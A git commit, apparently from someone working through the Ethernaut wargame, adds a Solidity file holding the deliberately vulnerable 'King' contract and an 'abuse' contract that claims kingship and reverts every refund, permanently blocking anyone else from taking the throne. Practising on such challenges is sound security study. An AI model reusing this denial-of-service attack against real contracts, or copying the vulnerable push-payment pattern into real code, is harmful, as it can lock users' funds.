4f31b037dc0b27491ca86d548cddbfbebe41d4c2
x4A6179 <59290923+x4A6179@users.noreply.github.com>
2021-10-15 20:12:38 -0400

    created vuln-contract subdirectory; initalized attempted takeover of King Contract

---
+++ vuln-contracts/ethernaut-king.sol
@@ -0,0 +1,36 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract King {
+
+  address payable king;
+  uint public prize;
+  address payable public owner;
+
+  constructor() public payable {
+    owner = msg.sender;
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function _king() public view returns (address payable) {
+    return king;
+  }
+}
+
+contract abuse{
+    function takeover(address kingAddress) public payable {
+        kingAddress.call{value: 1 ether }("");
+    }
+
+    fallback() external payable {
+        revert();
+    }
+}
